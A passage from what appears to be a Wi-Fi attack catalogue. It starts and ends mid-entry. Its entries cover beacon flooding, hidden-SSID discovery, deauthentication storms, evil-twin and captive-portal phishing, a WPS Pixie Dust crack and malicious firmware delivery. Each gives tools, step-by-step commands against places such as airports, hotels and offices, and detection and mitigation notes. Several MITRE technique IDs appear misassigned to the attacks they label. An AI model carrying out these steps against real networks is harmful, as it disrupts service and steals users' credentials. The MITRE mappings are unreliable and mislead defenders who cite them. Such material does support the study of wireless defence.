- **Attack Steps**: Step 1: Enable monitor mode using airmon-ng start wlan0. Step 2: Capture airport’s SSID using airodump-ng wlan0. Step 3: Create a list with multiple variations of that SSID like “AirportWiFi-1”, “Airport_WiFi_Free”. Step 4: Run mdk3 wlan0 b -f ssid_list.txt to start beacon flooding. Step 5: Passengers scanning Wi-Fi see dozens of similar-looking networks and may connect to wrong ones or experience dropped connections.
- **Detection**: Wi-Fi scanner anomaly detection
- **Solution**: WPA3/802.11w, monitor for rogue SSIDs
- **Tags**: Airport, SSID clone, beacon spoof

## IoT Device Disruption with Beacon Spam

- **Attack Type**: Beacon Frame Flooding
- **Target**: IoT Home Devices
- **Vulnerability**: Low memory & weak Wi-Fi resilience
- **MITRE**: T1499.001 (Endpoint DoS)
- **Impact**: IoT instability, degraded functionality
- **Tools**: Raspberry Pi, aircrack-ng, mdk4
- **Scenario**: A smart home with IoT sensors gets overwhelmed by hundreds of fake SSIDs, making the IoT hub struggle to maintain connections.
- **Attack Steps**: Step 1: Boot a Raspberry Pi with Kali Linux and enable monitor mode. Step 2: Generate 1000 SSIDs using a Python script. Step 3: Use mdk4 wlan0 b -f ssids.txt to broadcast them. Step 4: Observe smart bulbs, cameras, and speakers blinking or going offline. Step 5: Log system messages and connection retries on the IoT hub.
- **Detection**: Monitor IoT network logs, scan SSIDs
- **Solution**: Segment IoT from main Wi-Fi, limit channel range
- **Tags**: IoT Jam, SSID Overload

## University Campus SSID Overload

- **Attack Type**: Beacon Frame Flooding
- **Target**: University Wi-Fi Clients
- **Vulnerability**: Inability to validate SSID authenticity
- **MITRE**: T1498 (Network DoS)
- **Impact**: Academic disruption, slowdowns
- **Tools**: mdk3, Python script, airmon-ng
- **Scenario**: Attacker floods the university campus Wi-Fi with fake SSIDs like “CampusNet_Student”, “CampusFreeWiFi”, confusing students.
- **Attack Steps**: Step 1: Identify official campus SSID via airodump-ng. Step 2: Write a script to append suffixes to the SSID (e.g., “_Free”, “_Backup”, “_Support”). Step 3: Load the fake SSIDs into a text file. Step 4: Run mdk3 wlan0 b -f fakecampus.txt. Step 5: Students scanning for Wi-Fi now see 50+ similar names, leading to failed or unintended connections.
- **Detection**: User complaints, SSID audit tools
- **Solution**: Deploy WPA3-EAP, enable rogue AP alerts
- **Tags**: Campus Wi-Fi, SSID Spam

## Adaptive Beacon Flooding with Time Shifts

- **Attack Type**: Beacon Frame Flooding
- **Target**: Any 802.11 Devices
- **Vulnerability**: Lack of timing normalization in beacon processing
- **MITRE**: T1499 (Resource Exhaustion)
- **Impact**: Reduced performance, delayed scanning
- **Tools**: Scapy, Python, Wireshark
- **Scenario**: Beacon frames sent with alternating intervals (e.g., 100ms, 500ms, 250ms), mimicking legitimate devices while still overwhelming the Wi-Fi space.
- **Attack Steps**: Step 1: Use scapy to craft beacon frames with varying beacon intervals. Step 2: Randomize MAC addresses and SSID names. Step 3: Send beacon frames every few milliseconds, but with time jitter to bypass simple detection tools. Step 4: Observe Wi-Fi scanners and client logs for instability. Step 5: Record traffic with Wireshark to analyze beacon timing patterns.
- **Detection**: Analyze beacon timing variance
- **Solution**: Deploy intelligent WIDS systems
- **Tags**: Adaptive Beacon Jam, Stealth

## Beacon Jam to Prevent Device Roaming

- **Attack Type**: Beacon Frame Flooding
- **Target**: Enterprise Wi-Fi Clients
- **Vulnerability**: No filtering of beacon sources by devices
- **MITRE**: T1496, T1498
- **Impact**: Roaming failures, degraded mobility
- **Tools**: airmon-ng, mdk4, aircrack-ng
- **Scenario**: An attacker floods beacon frames across all nearby channels to prevent client devices from roaming between APs, forcing signal drops.
- **Attack Steps**: Step 1: Enable monitor mode. Step 2: Identify all AP channels using airodump-ng. Step 3: Use mdk4 in beacon mode across all channels with fake BSSIDs and high transmit power. Step 4: Set beacon interval low to increase congestion. Step 5: Devices lose their roaming ability, leading to degraded experience.
- **Detection**: Beacon channel scanning, load heatmaps
- **Solution**: Limit device auto-roaming, WIDS alerts
- **Tags**: Beacon Flood, Roaming Attack

## QR Code-Based Fake SSID Bait

- **Attack Type**: Beacon Frame Flooding
- **Target**: Public Wi-Fi Users
- **Vulnerability**: Blind trust in QR-based SSID info
- **MITRE**: T1557 (Man-in-the-Middle)
- **Impact**: Credential theft, malware delivery
- **Tools**: WiFi QR Generator, mdk3, Wifiphisher
- **Scenario**: A printed QR code in public links to a fake SSID that is broadcast via beacon flooding, fooling users to connect to malicious AP.
- **Attack Steps**: Step 1: Generate a Wi-Fi QR code for SSID “FreeLibraryWiFi”. Step 2: Set up beacon flood with same SSID using mdk3. Step 3: Display QR code in physical location. Step 4: Victims scan the code and connect to the fake SSID. Step 5: Redirect them to a phishing portal via Wifiphisher.
- **Detection**: DNS redirection logs, rogue portal detection
- **Solution**: Warn users, QR code validation policies
- **Tags**: QR Wi-Fi Phish, Social Engineering

## Continuous Fake Beacon Flood in Office

- **Attack Type**: Beacon Frame Flooding
- **Target**: Corporate Wi-Fi Clients
- **Vulnerability**: Internal physical access, insider threat
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: Internal Wi-Fi disruption
- **Tools**: Alfa Adapter, mdk3, PowerBank
- **Scenario**: A rogue employee uses a USB Wi-Fi adapter to continuously flood fake SSIDs in a corporate office, creating Wi-Fi chaos.
- **Attack Steps**: Step 1: Load fake SSIDs like “CorpWiFi123”, “Corp-Guest” onto a USB stick. Step 2: Use a USB Wi-Fi adapter and bootable Kali Linux on hidden device. Step 3: Power device via power bank, hide under desk. Step 4: Run beacon flood in loop. Step 5: Users complain of Wi-Fi instability and IT teams see SSID clutter.
- **Detection**: Rogue SSID logs, physical device inspection
- **Solution**: Secure physical spaces, scan for rogue APs
- **Tags**: Insider Attack, Hidden AP

## Directional Antenna Beacon Saturation

- **Attack Type**: Beacon Frame Flooding
- **Target**: Building Wi-Fi Clients
- **Vulnerability**: Inadequate RF shielding, open scan policies
- **MITRE**: T1498 (Network DoS)
- **Impact**: Localized Wi-Fi interference
- **Tools**: Yagi Antenna, mdk3, laptop
- **Scenario**: Attacker uses directional antenna to beam thousands of beacon frames at specific windows of a building, attacking internal networks from outside.
- **Attack Steps**: Step 1: Set up directional antenna targeting building. Step 2: Use mdk3 to send fake SSIDs like “CorpWiFi-Free”, “CorpNet”. Step 3: Flood beacon frames only at specific hours. Step 4: Internal users see rogue SSIDs on scan. Step 5: Security teams notice sporadic spikes in beacon traffic.
- **Detection**: Use RF signal heatmaps, check signal origin
- **Solution**: Limit scan range, apply 802.11w
- **Tags**: External RF Jam

## Multi-Vendor Beacon Exhaustion

- **Attack Type**: Beacon Frame Flooding
- **Target**: Consumer Wi-Fi Devices
- **Vulnerability**: UI vulnerabilities to SSID flood
- **MITRE**: T1499.001
- **Impact**: User frustration, slow device response
- **Tools**: mdk4, Scapy, 3 phones
- **Scenario**: Beacon flood attack tested across devices from Apple, Samsung, and Xiaomi to observe varied handling of beacon congestion.
- **Attack Steps**: Step 1: Run mdk4 with 500 SSIDs. Step 2: Simultaneously scan for Wi-Fi on three devices. Step 3: Observe UI delays, slow scrolling in Wi-Fi menus. Step 4: Try connecting to valid SSID while flood is active. Step 5: Record system behavior and lag levels per brand.
- **Detection**: Manual device testing
- **Solution**: Manufacturer updates, smart SSID filtering
- **Tags**: UX DoS, Device UX Test

## SSID Rotation Flood with Wordlists

- **Attack Type**: Beacon Frame Flooding
- **Target**: General Public
- **Vulnerability**: Blind trust in familiar-sounding SSIDs
- **MITRE**: T1557.002 (Evil Twin)
- **Impact**: Wi-Fi Misconnection, phishing risk
- **Tools**: mdk4, SSID Wordlist
- **Scenario**: The attacker uses a Wi-Fi SSID wordlist (e.g., rockyou) to generate beacon frames with real-word SSID names to appear more legitimate.
- **Attack Steps**: Step 1: Take an SSID wordlist (e.g., rockyou.txt). Step 2: Load into mdk4 to broadcast as fake SSIDs. Step 3: Continuously rotate broadcast SSIDs every second. Step 4: Devices show “Banking_Free”, “CoffeeNet”, etc., in scans. Step 5: Victims tricked into connecting to realistic-sounding networks.
- **Detection**: SSID reputation scoring tools
- **Solution**: Use known SSID whitelisting tools
- **Tags**: Social Wi-Fi, SSID Decoy

## Fake Corporate SSID to Trigger Auto-Connect

- **Attack Type**: Beacon Frame Flooding
- **Target**: Laptops configured with corporate SSID
- **Vulnerability**: Auto-connect behavior in Wi-Fi client settings
- **MITRE**: T1557.002 (Rogue APs)
- **Impact**: Misconnections, service drops, exposure to phishing
- **Tools**: airmon-ng, mdk4, Python, SSID sniffer
- **Scenario**: Many corporate laptops are configured to auto-connect to a specific internal SSID. An attacker mimics that SSID to cause misconnection and confusion.
- **Attack Steps**: Step 1: Use airodump-ng to passively monitor the airwaves and identify the corporate SSID (e.g., "CorpNet"). Step 2: Check for probe requests by laptops looking for “CorpNet” – this indicates auto-connect configuration. Step 3: Use mdk4 with b mode to broadcast fake beacon frames for “CorpNet” on a different channel. Step 4: Wait for corporate devices to connect to your fake SSID, mistaking it for their home network. Step 5: Record timestamps and device MACs to simulate client misbehavior or failed authentication attempts.
- **Detection**: Beacon fingerprinting, MAC monitoring
- **Solution**: Disable auto-connect to known SSIDs, enforce cert validation
- **Tags**: Auto-connect Abuse, Beacon Spoof

## Beacon Flood to Trigger Mobile Battery Drain

- **Attack Type**: Beacon Frame Flooding
- **Target**: Mobile Phones
- **Vulnerability**: Excessive Wi-Fi management processing
- **MITRE**: T1496 (Resource Hijacking)
- **Impact**: Battery drain, degraded mobile performance
- **Tools**: Kali Linux, mdk3, Battery Logger App
- **Scenario**: By sending frequent and excessive beacon frames, attackers can cause phones to constantly scan and re-evaluate Wi-Fi connections, leading to battery drain.
- **Attack Steps**: Step 1: Launch airmon-ng start wlan0 to activate monitor mode. Step 2: Create a list of 200 random SSIDs. Step 3: Use mdk3 wlan0 b -f ssid_list.txt to broadcast these beacon frames at a high rate (every 50ms). Step 4: Monitor a test phone’s battery over 30 minutes using a battery drain logger. Step 5: Observe that the phone continuously processes network scans, leading to CPU and battery usage spikes.
- **Detection**: Mobile OS battery logs, system app analytics
- **Solution**: Enable low-power scan modes, ignore non-secure SSIDs
- **Tags**: Battery Exploit, Resource Attack

## Channel Saturation Across 2.4GHz Spectrum

- **Attack Type**: Beacon Frame Flooding
- **Target**: APs and Clients on 2.4GHz
- **Vulnerability**: No management frame filtering, limited 2.4GHz space
- **MITRE**: T1498 (Network Denial of Service)
- **Impact**: Sluggish network performance, connection drops
- **Tools**: airmon-ng, mdk4, multi-interface setup
- **Scenario**: The attacker targets all 2.4GHz channels by broadcasting fake beacon frames simultaneously on each, crowding the spectrum and degrading connection quality.
- **Attack Steps**: Step 1: Use airmon-ng to enable monitor mode on multiple Wi-Fi interfaces (wlan0mon, wlan1mon, etc.). Step 2: Assign each interface a unique channel (1, 6, 11, etc.). Step 3: Use mdk4 on each interface to flood beacon frames with random SSIDs on assigned channels. Step 4: Monitor available networks on target device — expect over 100+ fake SSIDs spread across channels. Step 5: Attempt to connect to a legitimate AP; connection delays or failures will be observed due to spectrum congestion.
- **Detection**: RF analysis tools, channel utilization heatmaps
- **Solution**: Use 5GHz band, spectrum-aware APs
- **Tags**: Spectrum Saturation, Wi-Fi Congestion

## Time-Synchronized Beacon Waves

- **Attack Type**: Beacon Frame Flooding
- **Target**: Mobile and Laptop Clients
- **Vulnerability**: Lack of signal authenticity validation
- **MITRE**: T1557.002
- **Impact**: Fluctuating connectivity, prioritization errors
- **Tools**: Python Scapy, mdk4, cron or timing scripts
- **Scenario**: Beacon frames are released in tightly timed waves every 5 seconds with burst mode, tricking systems into interpreting them as priority APs.
- **Attack Steps**: Step 1: Write a Python script with Scapy to send 50 beacon frames in rapid succession with 5-second intervals. Step 2: Use randomized MAC addresses and SSIDs each cycle. Step 3: Schedule script execution using cron to run every 5 seconds. Step 4: Wi-Fi scanners on the client device refresh every few seconds and prioritize strongest SSIDs — these fake APs show up briefly but strongly. Step 5: Observe intermittent Wi-Fi instability due to sudden signal spikes and client confusion.
- **Detection**: Signal strength logs, timing correlation
- **Solution**: Client firmware update, filter SSIDs
- **Tags**: Beacon Timing Abuse, Signal Spike

## Hotel Wi-Fi Disruption with Custom Beacon Names

- **Attack Type**: Beacon Frame Flooding
- **Target**: Hotel Guests
- **Vulnerability**: Users connecting based on familiar SSID names
- **MITRE**: T1557.002
- **Impact**: Customer complaints, degraded service
- **Tools**: mdk3, airmon-ng, Notepad, PowerShell for SSID list prep
- **Scenario**: At a hotel lobby, an attacker floods the airwaves with SSIDs mimicking real services (“Hotel_Lobby_WiFi”, “RoomService_WiFi”), causing clients to fail connections.
- **Attack Steps**: Step 1: Observe hotel SSID using airodump-ng and note naming conventions. Step 2: Create a list with similar but fake names like “HotelLobby_FreeWiFi”, “RoomService_Connect”. Step 3: Format the list using a basic PowerShell script or Notepad. Step 4: Run mdk3 wlan0 b -f hotel_ssid_spoof.txt. Step 5: Guests scanning for Wi-Fi see conflicting names, leading to confusion, failed authentication, and frequent disconnections.
- **Detection**: AP logs, guest service reports
- **Solution**: WPA3 Enterprise, whitelist SSID in clients
- **Tags**: Hotel Wi-Fi Jam, Guest Disruption

## Hidden SSID Discovery via Passive Scanning

- **Attack Type**: Hidden AP Enumeration
- **Target**: Wi-Fi Access Point
- **Vulnerability**: SSID Cloaking (Hidden Beacon)
- **MITRE**: T1071.001
- **Impact**: Identification of hidden APs for further exploitation
- **Tools**: Wireshark, Airodump-ng
- **Scenario**: Attacker tries to discover hidden SSIDs (those not broadcasting their name) by passively capturing network traffic.
- **Attack Steps**: Step 1: Attacker sets wireless adapter to monitor mode using airmon-ng. Step 2: Launch airodump-ng wlan0mon to capture traffic and identify frames with no SSID (hidden). Step 3: Wait for a legitimate user to connect; when they do, the SSID appears in the association request. Step 4: Attacker logs the revealed SSID.
- **Detection**: Monitor association requests; analyze logs for unknown SSIDs
- **Solution**: Use MAC address filtering, WPA3, and rotate SSID periodically
- **Tags**: Wi-Fi, Hidden SSID, Airodump-ng

## Hidden SSID Brute-force Enumeration

- **Attack Type**: Hidden SSID Guessing
- **Target**: Wi-Fi Access Point
- **Vulnerability**: SSID Not Broadcasted
- **MITRE**: T1595.002
- **Impact**: Discovery of SSID allows full recon of network
- **Tools**: Aircrack-ng, SSID Bruteforce Tool
- **Scenario**: Attacker tries to guess a hidden SSID by brute-force using known/default SSID lists.
- **Attack Steps**: Step 1: Identify presence of hidden SSID by detecting beacon frames with no SSID name. Step 2: Use SSID guessing scripts (e.g., ssid-bruteforce.py) with common SSID names. Step 3: Inject fake probe requests to see which SSIDs the AP responds to. Step 4: If AP responds, the guessed SSID is correct.
- **Detection**: Alert for unusual probe requests and beacon anomalies
- **Solution**: Use APs that ignore unsolicited probe requests
- **Tags**: SSID Brute Force, Wi-Fi Hidden Network

## Hidden SSID DoS to Force Reconnect

- **Attack Type**: Forced Reassociation
- **Target**: Wi-Fi Client & AP
- **Vulnerability**: Client-to-AP traffic exposure
- **MITRE**: T1565.001
- **Impact**: Identification of hidden SSID without brute force
- **Tools**: Aireplay-ng, Airodump-ng
- **Scenario**: Attacker forces a deauthentication to reveal SSID in reconnect request from client.
- **Attack Steps**: Step 1: Monitor for clients connected to a hidden SSID AP. Step 2: Use aireplay-ng --deauth 10 -a [AP_MAC] -c [Client_MAC] wlan0mon to disconnect client. Step 3: Wait for the client to reconnect. Step 4: SSID is revealed in the association request, captured via Airodump-ng.
- **Detection**: Monitor deauth patterns, investigate unusual packet bursts
- **Solution**: Enable 802.11w (Protected Management Frames)
- **Tags**: Wi-Fi Deauth, SSID Discovery

## Evil Twin of Hidden SSID

- **Attack Type**: Rogue AP
- **Target**: Wi-Fi Client
- **Vulnerability**: Hidden AP Misuse
- **MITRE**: T1557.002
- **Impact**: User session hijack, credential theft
- **Tools**: Airbase-ng, Fluxion, Hostapd
- **Scenario**: After discovering a hidden SSID, attacker creates a fake AP with same SSID and better signal.
- **Attack Steps**: Step 1: Discover the hidden SSID via any method above. Step 2: Setup fake AP with airbase-ng -e [SSID] -c [channel] wlan0mon. Step 3: Use signal amplification to overpower real AP. Step 4: Victims auto-connect to fake AP if saved previously. Step 5: Intercept data or redirect to phishing portal.
- **Detection**: Detect duplicate SSIDs on same channel; RF fingerprinting
- **Solution**: Use WPA3 and unique SSID per AP
- **Tags**: Evil Twin, Hidden SSID Attack

## SSID Cloaking Evasion via Directed Probe Injection

- **Attack Type**: Probe Injection
- **Target**: Wi-Fi Access Point
- **Vulnerability**: Response to crafted probe frames
- **MITRE**: T1592.002
- **Impact**: Identification of SSID for future attack staging
- **Tools**: Scapy, Python Scripts
- **Scenario**: Attacker injects probe requests to the hidden AP to trigger beacon/probe responses that expose SSID.
- **Attack Steps**: Step 1: Write a Python script using Scapy to send probe requests with different SSIDs. Step 2: Target the MAC address of the hidden AP. Step 3: When the correct SSID is guessed, AP may respond with probe response (depends on config). Step 4: Capture and extract the SSID from the response frame.
- **Detection**: Monitor unexpected probe request patterns
- **Solution**: Harden AP to ignore unauthenticated probe requests
- **Tags**: Wi-Fi Probe Injection, SSID Cloak

## SSID Cloak Bypass via Client History

- **Attack Type**: Passive Recon
- **Target**: Wi-Fi Client
- **Vulnerability**: Device broadcasting past SSIDs
- **MITRE**: T1087.001
- **Impact**: Hidden SSID revealed indirectly via client activity
- **Tools**: Wireshark, Kismet
- **Scenario**: Attacker listens for probe requests from user devices that try to reconnect to previously joined hidden networks.
- **Attack Steps**: Step 1: Set wireless adapter to monitor mode using airmon-ng start wlan0. Step 2: Open Wireshark and filter packets using wlan.fc.type_subtype == 0x04 (probe request). Step 3: Observe probe requests sent from user devices trying to connect to hidden networks. Step 4: Record any SSID that appears in these requests. These represent hidden networks the device previously connected to. Step 5: Use this SSID info for impersonation or targeting.
- **Detection**: Monitor probe traffic volume and contents
- **Solution**: Configure clients not to probe for hidden networks
- **Tags**: SSID Leakage, Passive Recon

## Hidden SSID Combined with MAC Spoofing

- **Attack Type**: Client Imitation
- **Target**: Wi-Fi AP
- **Vulnerability**: Weak client verification
- **MITRE**: T1556.001
- **Impact**: Unauthorized access; network intrusion
- **Tools**: Macchanger, Airodump-ng
- **Scenario**: Attacker spoofs MAC address of a known client to connect to hidden SSID AP after SSID discovery.
- **Attack Steps**: Step 1: Use airodump-ng to capture connected client MAC addresses. Step 2: Identify MACs associated with hidden SSID APs. Step 3: Use macchanger -m [client_mac] wlan0 to spoof that MAC address. Step 4: Attempt to connect to the hidden AP using known credentials. Step 5: If successful, attacker is now masquerading as legitimate device.
- **Detection**: Use of same MAC from two devices detected
- **Solution**: Enable WPA3 with device authentication
- **Tags**: MAC Spoofing, SSID, Wi-Fi Intrusion

## Rogue AP with Matching Hidden SSID + DNS Spoof

- **Attack Type**: Phishing via Fake AP
- **Target**: Wi-Fi Client
- **Vulnerability**: Lack of AP identity verification
- **MITRE**: T1557.002
- **Impact**: Credential theft, malware delivery
- **Tools**: Hostapd, Dnsmasq, Bettercap
- **Scenario**: Attacker sets up fake AP with the discovered hidden SSID and poisons DNS to serve malicious sites.
- **Attack Steps**: Step 1: Discover the hidden SSID using passive scan or deauth attack. Step 2: Create rogue AP with same SSID and channel using Hostapd. Step 3: Setup DHCP and DNS spoofing using dnsmasq or bettercap. Step 4: Victim connects thinking it’s the real network. Step 5: Redirect user traffic to phishing page (e.g., fake login portal) via DNS spoofing. Step 6: Collect credentials or deliver malware.
- **Detection**: Analyze unexpected DNS resolution patterns
- **Solution**: Use HSTS, client-side cert pinning
- **Tags**: Evil Twin, DNS Spoof, Hidden AP

## Hidden SSID Replay Attack with Captured Frames

- **Attack Type**: Replay Attack
- **Target**: Wi-Fi AP
- **Vulnerability**: Weak replay protection
- **MITRE**: T1001.003
- **Impact**: Potential bypass of authentication or session hijack
- **Tools**: Tshark, Scapy, Wireshark
- **Scenario**: Attacker captures authentication frames from client and replays them to attempt reauthentication.
- **Attack Steps**: Step 1: Monitor and capture EAPOL handshake or authentication frames. Step 2: Save the packets using tshark -w handshake.cap. Step 3: Use Scapy to replay the frames back to the AP. Step 4: AP may respond differently if authentication mechanisms are weak. Step 5: Observe behavior for session reset or info leakage.
- **Detection**: Detect repeated handshake attempts from same MAC
- **Solution**: Implement 802.11w + strict replay protection
- **Tags**: SSID Replay, Wi-Fi Replay Attack

## Tracking Hidden AP Location via Signal Triangulation

- **Attack Type**: Location Mapping
- **Target**: Wi-Fi AP
- **Vulnerability**: Physical layer exposure
- **MITRE**: T1590.002
- **Impact**: Exposure of hidden AP location
- **Tools**: Kismet, GPS, WiFi Explorer
- **Scenario**: Attacker uses RSSI values to triangulate physical position of hidden AP.
- **Attack Steps**: Step 1: Use Kismet or WiFi Explorer to passively scan and log hidden SSID MAC and signal strength. Step 2: Move around physical environment and record GPS coordinates and RSSI strength. Step 3: Plot the values on a heatmap to triangulate AP location. Step 4: Use the result to identify physical access point for physical tampering or directional jamming.
- **Detection**: Analyze anomalous proximity probes
- **Solution**: Shield AP in Faraday-enclosed areas or rotate MACs
- **Tags**: Location Attack, SSID Cloaking

## Captive Portal Exploitation on Hidden SSID

- **Attack Type**: Social Engineering
- **Target**: Wi-Fi Client
- **Vulnerability**: Poor captive portal security
- **MITRE**: T1204.002
- **Impact**: Credential harvesting via phishing
- **Tools**: Fluxion, Wireshark
- **Scenario**: After SSID discovery, attacker clones captive portal of hidden SSID to collect credentials.
- **Attack Steps**: Step 1: Capture the captive portal response using Wireshark or browser dev tools while connected to hidden SSID. Step 2: Reconstruct or clone the HTML/JS files of the portal. Step 3: Setup rogue AP using same SSID and host fake portal using Apache/Fluxion. Step 4: Wait for users to connect and attempt login. Step 5: Log credentials and redirect user to real internet to avoid suspicion.
- **Detection**: Monitor for duplicate captive portals
- **Solution**: Use 802.1X or HTTPS redirect warnings
- **Tags**: Captive Portal, SSID Attack

## SSID Cloak Mapping with Beacon Flood Responses

- **Attack Type**: Beacon Manipulation
- **Target**: Wi-Fi AP
- **Vulnerability**: Beacon misconfiguration
- **MITRE**: T1595.001
- **Impact**: SSID revealed, network profiling
- **Tools**: Mdk3, Beacon Flood Scripts
- **Scenario**: Attacker floods area with beacon frames with guessed SSIDs to map responses.
- **Attack Steps**: Step 1: Use mdk3 wlan0mon b -f ssid-list.txt to broadcast many fake SSIDs. Step 2: Monitor probe responses from hidden APs reacting to matching fake SSIDs. Step 3: Analyze logs for which fake SSID resulted in a probe response. Step 4: Confirm and map hidden SSIDs.
- **Detection**: Monitor beacon flood traffic
- **Solution**: Configure AP to ignore unsolicited beacons
- **Tags**: SSID Mapping, Beacon Flood

## Exploiting Device Roaming Between Hidden and Public SSID

- **Attack Type**: Roaming Abuse
- **Target**: Wi-Fi Client
- **Vulnerability**: Roaming trust issues
- **MITRE**: T1557.001
- **Impact**: Session hijack or credential theft
- **Tools**: Airodump-ng, Hostapd, Scapy
- **Scenario**: Devices that roam between hidden SSID and public AP can be exploited during transition.
- **Attack Steps**: Step 1: Identify device switching between home (hidden) and open Wi-Fi (public). Step 2: Setup rogue AP mimicking public Wi-Fi with aggressive beaconing. Step 3: When device disconnects from hidden AP, it auto-connects to fake public AP. Step 4: Attack is launched via man-in-the-middle, DNS spoof, or traffic manipulation.
- **Detection**: Track signal handoffs, abnormal roaming patterns
- **Solution**: Disable auto-connect or use VPN
- **Tags**: Wi-Fi Roaming Exploit, SSID Cloak

## Unmasking SSID via Timing Analysis

- **Attack Type**: Side Channel Timing
- **Target**: Wi-Fi AP
- **Vulnerability**: Timing side-channel
- **MITRE**: T1592.001
- **Impact**: Inference of SSID or AP behavior via timing
- **Tools**: Scapy, Wireshark
- **Scenario**: Using the timing of responses to crafted packets to infer presence and identity of hidden SSIDs.
- **Attack Steps**: Step 1: Send probe requests with random SSIDs to target AP MAC. Step 2: Measure time delay in probe responses. Step 3: Detect differences in timing when correct SSID is guessed vs. wrong ones. Step 4: Use timing patterns to narrow down SSID possibilities.
- **Detection**: Look for uniform timing responses
- **Solution**: Add jitter/random delay in AP probe replies
- **Tags**: SSID Side Channel, Wi-Fi Timing

## Deauthing All Clients to Trigger Reconnect Storm

- **Attack Type**: Broadcast Deauth Storm
- **Target**: Wi-Fi Clients & AP
- **Vulnerability**: No PMF or rate limiting
- **MITRE**: T1498.001
- **Impact**: Forced SSID reveal and user disruption
- **Tools**: Aireplay-ng, Airodump-ng
- **Scenario**: Attacker disconnects all users from hidden SSID to observe reconnections and discover SSID.
- **Attack Steps**: Step 1: Monitor all traffic with airodump-ng wlan0mon. Step 2: Identify the MAC of hidden SSID AP. Step 3: Use aireplay-ng --deauth 1000 -a [AP_MAC] wlan0mon to disconnect all users. Step 4: Observe reconnection attempts; SSID revealed in association frames. Step 5: Document SSID for further attack staging.
- **Detection**: Monitor mass deauths and broadcast storm
- **Solution**: Use 802.11w (Protected Management Frames)
- **Tags**: SSID Storm, Deauth Attack

## Probing Clients to Elicit SSID Responses

- **Attack Type**: Active Probing
- **Target**: Wi-Fi Client
- **Vulnerability**: Client device memory of past networks
- **MITRE**: T1595.002
- **Impact**: Hidden SSID revealed from client-side, not AP
- **Tools**: Scapy, Wireshark
- **Scenario**: Attacker sends probe requests to nearby client devices with guessed SSIDs to trigger a response that reveals a matching hidden SSID.
- **Attack Steps**: Step 1: Set up your wireless adapter in monitor mode using airmon-ng start wlan0. Step 2: Identify devices already connected or previously connected to a hidden SSID using airodump-ng. Step 3: Write a simple Python script using Scapy to send probe requests with a list of common SSID names (e.g., "CorpNet", "AdminAP"). Step 4: Monitor with Wireshark or a Scapy sniffer to capture probe responses from client devices. Step 5: When a client recognizes and responds to one of the SSIDs, attacker confirms that as the hidden SSID.
- **Detection**: Watch for unsolicited probe responses
- **Solution**: Educate users to disable auto-connect for hidden networks
- **Tags**: SSID Elicitation, Probing Clients

## SSID Cloak Bypass Using WPS Pixie Dust Attack

- **Attack Type**: WPS Exploit
- **Target**: Wi-Fi Access Point
- **Vulnerability**: WPS enabled on hidden SSID
- **MITRE**: T1210
- **Impact**: Full network access bypassing SSID requirement
- **Tools**: Reaver, PixieWPS
- **Scenario**: Some hidden SSIDs may still have WPS enabled. Attacker exploits WPS to access hidden AP without knowing SSID.
- **Attack Steps**: Step 1: Use wash tool to scan for WPS-enabled networks (even hidden SSIDs show MAC and WPS status). Step 2: Use reaver -i wlan0mon -b [AP_MAC] -K 1 -vv to perform Pixie Dust attack (offline PIN crack). Step 3: If successful, Reaver will return the WPA passphrase of the AP—even if the SSID was hidden. Step 4: Connect to the AP using wpa_supplicant or system network manager with the discovered passphrase. Step 5: Confirm the SSID using iw wlan0 link or check DHCP lease logs.
- **Detection**: Monitor for Reaver probe signatures
- **Solution**: Disable WPS completely on all access points
- **Tags**: Hidden SSID, WPS Bypass, Pixie Dust

## Coordinated Multi-Client SSID Sniffing

- **Attack Type**: Distributed Sniffing
- **Target**: Wi-Fi Clients
- **Vulnerability**: Mobile device SSID leakage
- **MITRE**: T1590.003
- **Impact**: Mapping of hidden SSIDs across geographic regions
- **Tools**: Raspberry Pi + Kismet, GPS modules
- **Scenario**: Attacker sets up multiple sniffing devices in an area to track SSID broadcast responses from clients across space and time.
- **Attack Steps**: Step 1: Deploy multiple Raspberry Pi devices with Wi-Fi cards in monitor mode across an area. Step 2: Run Kismet on each to log probe requests and responses. Include GPS modules for correlation. Step 3: Clients that roam while searching for hidden SSIDs may leak SSIDs via probe requests. Step 4: Combine logs from multiple Pi units to build a complete SSID profile over time. Step 5: Correlate SSIDs with known vendors and use in social engineering or AP impersonation.
- **Detection**: High volume of passive probe traffic from different sources
- **Solution**: Mobile devices should randomize MACs and disable auto-join
- **Tags**: SSID Profiling, IoT Wi-Fi Surveillance

## Malicious Firmware Upgrade via Hidden SSID Spoof

- **Attack Type**: Hidden SSID + Supply Chain Attack
- **Target**: IoT Device / Embedded System
- **Vulnerability**: Trusting auto-update hidden SSIDs
- **MITRE**: T1195
- **Impact**: Firmware-level compromise of infrastructure
- **Tools**: Hostapd, TFTP Server, Rogue DHCP
- **Scenario**: Some IoT or enterprise devices auto-connect to specific hidden SSIDs for updates. Attacker exploits this behavior.
- **Attack Steps**: Step 1: Identify vendor documentation showing firmware update behavior via Wi-Fi (e.g., printers or cameras). Step 2: Determine hidden SSID used (e.g., "UpdateNet") via probes or client activity. Step 3: Set up a rogue AP using Hostapd with that SSID and matching channel. Step 4: Configure DHCP and fake TFTP server with malicious firmware image. Step 5: When device connects, it may auto-download and apply the update. Attacker gains control.
- **Detection**: Audit update behavior logs, track auto-connect traffic
- **Solution**: Use signed firmware + disable Wi-Fi update triggers
- **Tags**: SSID Cloaking, Supply Chain, Firmware Hack

## SSID Cloak Deception via Fake Hidden SSID to Lure Attackers

- **Attack Type**: Honeypot Setup
- **Target**: Attacker Recon Tools
- **Vulnerability**: Attacker enumeration behavior
- **MITRE**: T1589
- **Impact**: Early warning system for active wireless recon attempts
- **Tools**: Kismet, Snort, Hostapd
- **Scenario**: Defender sets up fake hidden SSID to detect and trap attackers trying to enumerate or spoof it.
- **Attack Steps**: Step 1: Create an AP with SSID set to "hidden" (i.e., no broadcast in beacon frames). Step 2: Set up Hostapd to accept probe requests but monitor all connection attempts. Step 3: Integrate IDS like Snort or Suricata to detect brute-force, MAC spoofing, or deauth traffic. Step 4: If any attacker attempts to connect or scan, the logs are collected and attacker MAC/IP is recorded. Step 5: Alerts can be sent to admin dashboard or SIEM for follow-up.
- **Detection**: Monitor probe and deauth logs for unknown MACs
- **Solution**: Use decoy SSIDs to waste attacker time and collect intel
- **Tags**: Hidden SSID Honeypot, Wireless Deception

## Fast BSS Transition Key Reinstallation Attack (KRACK variant)

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Enterprise Wi-Fi Clients
- **Vulnerability**: FT Reassociation allows reusing keys
- **MITRE**: T1557.001 (Adversary-in-the-Middle: Wireless)
